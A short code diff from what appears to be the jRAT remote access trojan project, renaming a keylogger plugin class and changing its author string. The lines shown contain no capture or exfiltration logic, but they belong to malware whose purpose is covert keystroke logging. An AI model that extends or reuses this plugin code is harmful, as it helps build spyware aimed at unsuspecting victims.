@@ -23,7 +23,7 @@ import jrat.api.events.OnEnableEvent;
 import jrat.api.events.OnPacketEvent;
 import jrat.api.events.OnSendPacketEvent;
 
-public class ClientPlugin extends RATPlugin {
+public class KeyloggerPlugin extends RATPlugin {
 
 	public static final String ICON_LOCATION = System.getProperty("jrat.dir") + File.separator + "/files/plugins/Keylogger/icon.png";
 	public static final byte KEY_HEADER = 121;
@@ -149,7 +149,7 @@ public class ClientPlugin extends RATPlugin {
 	}
 
 	public String getAuthor() {
-		return "redpois0n";
+		return "jRAT";
 	}
 
 	public void onConnect(OnConnectEvent event) throws Exception {
